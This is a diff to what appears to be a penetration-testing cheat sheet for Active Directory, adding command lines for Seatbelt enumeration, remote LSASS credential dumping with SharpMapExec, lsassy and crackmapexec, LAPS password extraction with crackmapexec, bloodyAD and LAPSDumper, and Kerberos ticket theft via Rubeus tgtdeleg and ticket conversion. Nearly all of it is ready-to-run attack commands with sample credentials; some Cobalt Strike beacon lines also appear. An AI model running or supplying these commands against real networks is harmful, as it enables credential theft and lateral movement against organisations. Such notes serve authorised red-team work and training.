@@ -1501,7 +1501,8 @@ beacon> keylogger 30
 [...]
 
 # SeatBelt
-beacon> execute-assembly /opt/tools/SeatBelt.exe -group=system
+> seatbelt.exe -group=system
+> seatbelt -group=user
 ```
 
 #### Port scanning
@@ -2126,9 +2127,18 @@ mimikatz # sekurlsa::logonpasswords
 ###### Remote LSASS
 
 ```
+# sharpmapexec from windows
 SharpMapExec.exe kerberos winrm /user:sqlsvc /password:Ch3xmix! /domain:vault.local /computername:sql-1.vault.local /m:comsvcs
 
 SharpMapExec.exe ntlm winrm /user:sqlsvc /password:Ch3xmix! /domain:vault.local /computername:sql-1.vault.local /m:comsvcs
+
+# lsassy
+$ lsassy 10.90.12.101 -u 'administrator' -p ooAutCRsYr
+
+$ lsassy 10.90.12.101 -u 'administrator' -p ooAutCRsYr -m nanodump -O nanodump_path=/path/to/nanodump.exe
+
+# crackmapexec
+$ cme smb 10.90.12.101 -u administrator -p ooAutCRsYr -M lsassy
 ```
 
 ###### Disable LSA protection with Mimikatz
@@ -2257,21 +2267,23 @@ beacon> download \\vault.io\SysVol\vault.io\Policies\{FDC369C2-35C2-4D97-B455-BB
 
 #### Creds
 
-```
-beacon> make_token vault.io\mssql_svc Passw0rd
-[...]
+Pull LAPS credentials
 
+```
 # if laps tools are installed
-beacon> powershell Get-Command *AdmPwd
+> powershell Get-Command *AdmPwd
 
 # using PowerView
-beacon> Get-DomainComputer
-```
+> Get-DomainComputer
 
-Using CrackMapExec
+# Using CrackMapExec
+$ cme ldap vic.tim.local -u tom -p October2021 -M laps
 
-```
-cme ldap vic.tim.local -u tom -p October2021 -M laps
+# bloodyAD
+$ python3 bloodyAD.py -d domain.local -u p@ssw0r_d -p p@ssw0r_d --host 10.90.10.1 getObjectAttributes wkstn8.domain.local
+
+# n00py/LAPSDumper
+$ python laps.py -u p@ssw0r_d -p p@ssw0r_d -l 10.90.10.1 -d domain.local
 ```
 
 ### Impersonation
@@ -2875,6 +2887,21 @@ kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
 - https://packages.debian.org/stretch/krb5-user
 
 #### Credential Cache File Basics
+
+##### TGT Delegation
+
+Get Kerberos ticket without username/password
+
+```
+# grab base64 encoded ticket
+> Rubues tgtdeleg
+
+# convert
+$ base64 -d user.b64 > user.ticket
+
+# convert ccache
+$ ticketConverter.py user.ticket user.cache
+```
 
 Search for credential cache file
 
